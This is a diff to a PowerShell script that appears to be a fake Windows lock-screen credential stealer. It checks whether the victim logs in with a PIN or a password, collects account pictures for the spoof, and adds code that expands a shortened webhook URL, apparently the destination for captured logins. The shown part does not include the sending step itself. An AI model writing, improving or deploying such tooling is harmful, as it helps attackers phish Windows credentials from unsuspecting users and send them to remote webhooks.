@@ -7,6 +7,9 @@ $wpURL = "https://wallpapercave.com/wp/wp9378862.jpg"
 $value = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\NgcPin" -Name "DeviceLockEnforcementPending" -ErrorAction SilentlyContinue
 if ($value -eq 0 -or $value -eq 1) {$mthd = "PIN"} else {$mthd = "Password"}
 
+# shortened URL Detection
+if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
+
 # FIND ACCOUNT PICTURES
 $accountPicturesPath = "C:\ProgramData\Microsoft\Default Account Pictures"
 $imageFiles = Get-ChildItem -Path $accountPicturesPath -include "*.jpg", "*.png", "*.bmp" -File -Recurse
